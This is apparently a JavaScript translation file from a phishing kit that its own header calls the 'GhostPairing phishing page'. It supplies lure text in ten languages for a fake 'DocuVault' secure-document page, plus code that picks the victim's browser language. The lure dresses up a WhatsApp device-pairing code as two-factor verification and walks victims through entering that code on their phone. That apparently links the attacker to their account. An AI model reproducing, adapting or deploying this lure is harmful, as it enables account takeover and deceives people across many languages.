/* i18n.js — Multi-language translations for GhostPairing phishing page */
const translations = {
    en: {
        title: "Secure Document Access",
        subtitle: "Identity verification required",
        brandName: "DocuVault",
        step1: {
            title: "Two-Factor Authentication Required",
            description: "To access this secure document, identity verification via WhatsApp is required. This ensures only authorized recipients can view its contents.",
            why_title: "Why verification?",
            why_description: "This security measure protects sensitive documents from unauthorized access and ensures regulatory compliance. The process completes in under 60 seconds.",
            phone_label: "WhatsApp phone number",
            button: "Verify Identity",
            footer: "By continuing, you confirm you are authorized to access this document."
        },
        step2: {
            title: "Verification in Progress",
            description: "Establishing secure connection and generating your verification code. Please wait briefly.",
            status: "Connecting to verification system..."
        },
        step3: {
            title: "Verification Code Ready",
            description: "A unique verification code has been generated for your session. Enter it on your mobile device to complete authentication.",
            code_label: "Enter this code on your phone:",
            instructions_title: "Steps to complete:",
            instructions: [
                "Open WhatsApp on your phone",
                "A verification request will appear",
                "Enter the code shown above",
                "Wait for confirmation"
            ],
            verifying: "Verifying:",
            cancel: "Cancel Verification"
        },
        step4: {
            title: "Awaiting Confirmation",
            description: "Please enter the verification code on your phone. The system is waiting for your authentication.",
            waiting: "Waiting for code entry...",
            note_title: "Note:",
            note_description: "Once you enter the code on your phone, this page will automatically grant you access."
        },
        step5: {
            title: "Verification Complete",
            description: "Your identity has been verified successfully.",
            success_title: "Authentication Successful",
            success_description: "Thank you for completing verification. Redirecting you to the document.",
            redirecting: "Redirecting to document...",
            manual_redirect: "If not redirected,",
            click_here: "click here"
        }
    },
    de: {
        title: "Sicherer Dokumentenzugriff",
        subtitle: "Identitätsprüfung erforderlich",
        brandName: "DocuVault",
        step1: {
            title: "Zwei-Faktor-Authentifizierung",
            description: "Für den Zugriff ist eine Identitätsprüfung per WhatsApp erforderlich.",
            why_title: "Warum diese Prüfung?",
            why_description: "Diese Sicherheitsmaßnahme schützt vor unbefugtem Zugriff. Der Vorgang dauert ca. 60 Sekunden.",
            phone_label: "WhatsApp-Telefonnummer",
            button: "Identität prüfen",
            footer: "Durch Fortfahren bestätigen Sie Ihre Zugriffsberechtigung."
        },
        step2: {
            title: "Prüfung läuft",
            description: "Sichere Verbindung wird hergestellt und Code generiert.",
            status: "Verbinde mit Verifizierungssystem..."
        },
        step3: {
            title: "Code bereit",
            description: "Ein eindeutiger Code wurde generiert. Geben Sie ihn auf Ihrem Gerät ein.",
            code_label: "Geben Sie diesen Code ein:",
            instructions_title: "Schritte:",
            instructions: [
                "Öffnen Sie WhatsApp",
                "Bestätigen Sie die Anfrage",
                "Geben Sie den Code ein",
                "Warten Sie auf Bestätigung"
            ],
            verifying: "Prüfe:",
            cancel: "Abbrechen"
        },
        step4: {
            title: "Warte auf Bestätigung",
            description: "Bitte geben Sie den Code auf Ihrem Telefon ein.",
            waiting: "Warte auf Code-Eingabe...",
            note_title: "Hinweis:",
            note_description: "Nach Eingabe wird der Zugriff automatisch gewährt."
        },
        step5: {
            title: "Prüfung abgeschlossen",
            description: "Ihre Identität wurde bestätigt.",
            success_title: "Authentifizierung erfolgreich",
            success_description: "Sie werden zum Dokument weitergeleitet.",
            redirecting: "Weiterleitung...",
            manual_redirect: "Falls nicht weitergeleitet,",
            click_here: "hier klicken"
        }
    },
    es: {
        title: "Acceso Seguro a Documentos",
        subtitle: "Verificación de identidad requerida",
        brandName: "DocuVault",
        step1: {
            title: "Autenticación de Dos Factores",
            description: "Se requiere verificación por WhatsApp para acceder a este documento.",
            why_title: "¿Por qué?",
            why_description: "Protege contra accesos no autorizados. El proceso toma ~60 segundos.",
            phone_label: "Número de WhatsApp",
            button: "Verificar Identidad",
            footer: "Al continuar, confirma su autorización para acceder."
        },
        step2: {
            title: "Verificación en Curso",
            description: "Estableciendo conexión segura y generando código.",
            status: "Conectando al sistema..."
        },
        step3: {
            title: "Código Generado",
            description: "Ingrese este código en su dispositivo móvil.",
            code_label: "Ingrese este código:",
            instructions_title: "Pasos:",
            instructions: [
                "Abra WhatsApp",
                "Verá una solicitud",
                "Ingrese el código",
                "Espere confirmación"
            ],
            verifying: "Verificando:",
            cancel: "Cancelar"
        },
        step4: {
            title: "Esperando Confirmación",
            description: "Ingrese el código en su teléfono.",
            waiting: "Esperando...",
            note_title: "Nota:",
            note_description: "Al ingresar el código, se le dará acceso."
        },
        step5: {
            title: "Verificación Completa",
            description: "Identidad verificada con éxito.",
            success_title: "Autenticación Exitosa",
            success_description: "Redirigiendo al documento.",
            redirecting: "Redirigiendo...",
            manual_redirect: "Si no es redirigido,",
            click_here: "haga clic aquí"
        }
    },
    fr: {
        title: "Accès Sécurisé",
        subtitle: "Vérification requise",
        brandName: "DocuVault",
        step1: {
            title: "Authentification à Deux Facteurs",
            description: "Vérification par WhatsApp requise pour accéder à ce document.",
            why_title: "Pourquoi?",
            why_description: "Protection contre les accès non autorisés. ~60 secondes.",
            phone_label: "Numéro WhatsApp",
            button: "Vérifier",
            footer: "En continuant, vous confirmez votre autorisation."
        },
        step2: {
            title: "Vérification en Cours",
            description: "Connexion sécurisée en cours.",
            status: "Connexion au système..."
        },
        step3: {
            title: "Code Généré",
            description: "Entrez ce code sur votre appareil mobile.",
            code_label: "Entrez ce code:",
            instructions_title: "Étapes:",
            instructions: [
                "Ouvrez WhatsApp",
                "Vous verrez une demande",
                "Entrez le code",
                "Attendez confirmation"
            ],
            verifying: "Vérification:",
            cancel: "Annuler"
        },
        step4: {
            title: "En Attente",
            description: "Entrez le code sur votre téléphone.",
            waiting: "En attente...",
            note_title: "Note:",
            note_description: "L'accès sera accordé automatiquement."
        },
        step5: {
            title: "Terminé",
            description: "Vérifiée avec succès.",
            success_title: "Authentification Réussie",
            success_description: "Redirection vers le document.",
            redirecting: "Redirection...",
            manual_redirect: "Si non redirigé,",
            click_here: "cliquez ici"
        }
    },
    it: {
        title: "Accesso Sicuro",
        subtitle: "Verifica richiesta",
        brandName: "DocuVault",
        step1: {
            title: "Autenticazione a Due Fattori",
            description: "Verifica WhatsApp richiesta per accedere al documento.",
            why_title: "Perché?",
            why_description: "Protegge da accessi non autorizzati. ~60 secondi.",
            phone_label: "Numero WhatsApp",
            button: "Verifica",
            footer: "Continuando, confermi l'autorizzazione."
        },
        step2: {
            title: "Verifica in Corso",
            description: "Connessione sicura in corso.",
            status: "Connessione al sistema..."
        },
        step3: {
            title: "Codice Generato",
            description: "Inserisci questo codice sul tuo dispositivo.",
            code_label: "Inserisci il codice:",
            instructions_title: "Passaggi:",
            instructions: [
                "Apri WhatsApp",
                "Vedrai una richiesta",
                "Inserisci il codice",
                "Attendi conferma"
            ],
            verifying: "Verifica:",
            cancel: "Annulla"
        },
        step4: {
            title: "In Attesa",
            description: "Inserisci il codice sul telefono.",
            waiting: "In attesa...",
            note_title: "Nota:",
            note_description: "L'accesso sarà concesso automaticamente."
        },
        step5: {
            title: "Completato",
            description: "Verificato con successo.",
            success_title: "Autenticazione Riuscita",
            success_description: "Reindirizzamento al documento.",
            redirecting: "Reindirizzamento...",
            manual_redirect: "Se non reindirizzato,",
            click_here: "clicca qui"
        }
    },
    pt: {
        title: "Acesso Seguro",
        subtitle: "Verificação necessária",
        brandName: "DocuVault",
        step1: {
            title: "Autenticação de Dois Fatores",
            description: "Verificação WhatsApp necessária para acessar este documento.",
            why_title: "Por quê?",
            why_description: "Protege contra acesso não autorizado. ~60 segundos.",
            phone_label: "Número WhatsApp",
            button: "Verificar",
            footer: "Ao continuar, você confirma sua autorização."
        },
        step2: {
            title: "Verificação em Andamento",
            description: "Estabelecendo conexão segura.",
            status: "Conectando ao sistema..."
        },
        step3: {
            title: "Código Gerado",
            description: "Insira este código no seu dispositivo.",
            code_label: "Insira o código:",
            instructions_title: "Passos:",
            instructions: [
                "Abra o WhatsApp",
                "Você verá uma solicitação",
                "Insira o código",
                "Aguarde confirmação"
            ],
            verifying: "Verificando:",
            cancel: "Cancelar"
        },
        step4: {
            title: "Aguardando",
            description: "Insira o código no telefone.",
            waiting: "Aguardando...",
            note_title: "Nota:",
            note_description: "O acesso será concedido automaticamente."
        },
        step5: {
            title: "Concluído",
            description: "Verificado com sucesso.",
            success_title: "Autenticação Bem-sucedida",
            success_description: "Redirecionando ao documento.",
            redirecting: "Redirecionando...",
            manual_redirect: "Se não for redirecionado,",
            click_here: "clique aqui"
        }
    },
    ru: {
        title: "Безопасный Доступ",
        subtitle: "Требуется проверка",
        brandName: "DocuVault",
        step1: {
            title: "Двухфакторная Аутентификация",
            description: "Для доступа требуется проверка через WhatsApp.",
            why_title: "Зачем?",
            why_description: "Защита от несанкционированного доступа. ~60 секунд.",
            phone_label: "Номер WhatsApp",
            button: "Проверить",
            footer: "Продолжая, вы подтверждаете авторизацию."
        },
        step2: {
            title: "Проверка",
            description: "Установка безопасного соединения.",
            status: "Подключение к системе..."
        },
        step3: {
            title: "Код Сгенерирован",
            description: "Введите этот код на вашем устройстве.",
            code_label: "Введите код:",
            instructions_title: "Шаги:",
            instructions: [
                "Откройте WhatsApp",
                "Вы увидите запрос",
                "Введите код",
                "Дождитесь подтверждения"
            ],
            verifying: "Проверка:",
            cancel: "Отмена"
        },
        step4: {
            title: "Ожидание",
            description: "Введите код на телефоне.",
            waiting: "Ожидание...",
            note_title: "Примечание:",
            note_description: "Доступ будет предоставлен автоматически."
        },
        step5: {
            title: "Завершено",
            description: "Проверка пройдена.",
            success_title: "Аутентификация Успешна",
            success_description: "Перенаправление к документу.",
            redirecting: "Перенаправление...",
            manual_redirect: "Если не перенаправлены,",
            click_here: "нажмите здесь"
        }
    },
    ar: {
        title: "وصول آمن للمستند",
        subtitle: "التحقق مطلوب",
        brandName: "DocuVault",
        step1: {
            title: "المصادقة الثنائية",
            description: "التحقق عبر واتساب مطلوب للوصول.",
            why_title: "لماذا؟",
            why_description: "حماية من الوصول غير المصرح به. ~60 ثانية.",
            phone_label: "رقم الواتساب",
            button: "تحقق",
            footer: "بالمتابعة، تؤكد تفويضك."
        },
        step2: {
            title: "جاري التحقق",
            description: "إنشاء اتصال آمن.",
            status: "الاتصال بالنظام..."
        },
        step3: {
            title: "تم إنشاء الرمز",
            description: "أدخل هذا الرمز على جهازك.",
            code_label: "أدخل الرمز:",
            instructions_title: "الخطوات:",
            instructions: [
                "افتح واتساب",
                "سترى طلب تحقق",
                "أدخل الرمز",
                "انتظر التأكيد"
            ],
            verifying: "التحقق:",
            cancel: "إلغاء"
        },
        step4: {
            title: "في الانتظار",
            description: "أدخل الرمز على الهاتف.",
            waiting: "في الانتظار...",
            note_title: "ملاحظة:",
            note_description: "سيتم منح الوصول تلقائياً."
        },
        step5: {
            title: "مكتمل",
            description: "تم التحقق بنجاح.",
            success_title: "تمت المصادقة",
            success_description: "جاري التوجيه للمستند.",
            redirecting: "جاري التوجيه...",
            manual_redirect: "إذا لم يتم التوجيه،",
            click_here: "اضغط هنا"
        }
    },
    zh: {
        title: "安全文档访问",
        subtitle: "需要身份验证",
        brandName: "DocuVault",
        step1: {
            title: "双因素认证",
            description: "需要通过WhatsApp进行身份验证。",
            why_title: "为什么？",
            why_description: "防止未授权访问。约60秒完成。",
            phone_label: "WhatsApp号码",
            button: "验证身份",
            footer: "继续即表示您确认授权。"
        },
        step2: {
            title: "验证中",
            description: "建立安全连接中。",
            status: "连接验证系统..."
        },
        step3: {
            title: "验证码已生成",
            description: "在您的设备上输入此验证码。",
            code_label: "输入验证码：",
            instructions_title: "步骤：",
            instructions: [
                "打开WhatsApp",
                "您会看到验证请求",
                "输入验证码",
                "等待确认"
            ],
            verifying: "验证：",
            cancel: "取消"
        },
        step4: {
            title: "等待中",
            description: "在手机上输入验证码。",
            waiting: "等待中...",
            note_title: "注意：",
            note_description: "输入验证码后将自动授予访问权限。"
        },
        step5: {
            title: "完成",
            description: "验证成功。",
            success_title: "认证成功",
            success_description: "正在跳转到文档。",
            redirecting: "跳转中...",
            manual_redirect: "如未自动跳转，",
            click_here: "点击此处"
        }
    },
    ja: {
        title: "安全な文書アクセス",
        subtitle: "本人確認が必要です",
        brandName: "DocuVault",
        step1: {
            title: "二要素認証",
            description: "WhatsAppによる本人確認が必要です。",
            why_title: "なぜ？",
            why_description: "不正アクセスを防止します。約60秒。",
            phone_label: "WhatsApp番号",
            button: "確認",
            footer: "続行すると、アクセス権限を確認します。"
        },
        step2: {
            title: "確認中",
            description: "安全な接続を確立中。",
            status: "システムに接続中..."
        },
        step3: {
            title: "コード生成",
            description: "このコードをデバイスに入力してください。",
            code_label: "コードを入力：",
            instructions_title: "手順：",
            instructions: [
                "WhatsAppを開く",
                "確認リクエストが表示されます",
                "コードを入力",
                "確認を待つ"
            ],
            verifying: "確認中：",
            cancel: "キャンセル"
        },
        step4: {
            title: "待機中",
            description: "電話でコードを入力してください。",
            waiting: "待機中...",
            note_title: "注意：",
            note_description: "コード入力後、自動的にアクセスが許可されます。"
        },
        step5: {
            title: "完了",
            description: "確認が完了しました。",
            success_title: "認証成功",
            success_description: "文書にリダイレクトします。",
            redirecting: "リダイレクト中...",
            manual_redirect: "リダイレクトされない場合、",
            click_here: "こちらをクリック"
        }
    }
};

/* Detect user language */
const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
const currentLang = translations[userLang] ? userLang : 'en';

/* Apply translations to DOM elements */
function i18n() {
    const lang = translations[currentLang];

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        let value = lang;
        for (const k of key.split('.')) {
            value = value?.[k];
        }
        if (value !== undefined && value !== null) {
            el.textContent = value;
        }
    });

    document.querySelectorAll('[data-i18n-list]').forEach(el => {
        const key = el.getAttribute('data-i18n-list');
        let value = lang;
        for (const k of key.split('.')) {
            value = value?.[k];
        }
        if (Array.isArray(value)) {
            const items = el.querySelectorAll('li');
            value.forEach((text, idx) => {
                if (items[idx]) {
                    const strong = items[idx].querySelector('strong');
                    if (strong) {
                        items[idx].innerHTML = text + ': ' + strong.outerHTML;
                    } else {
                        items[idx].textContent = text;
                    }
                }
            });
        }
    });

    document.documentElement.lang = currentLang;
}
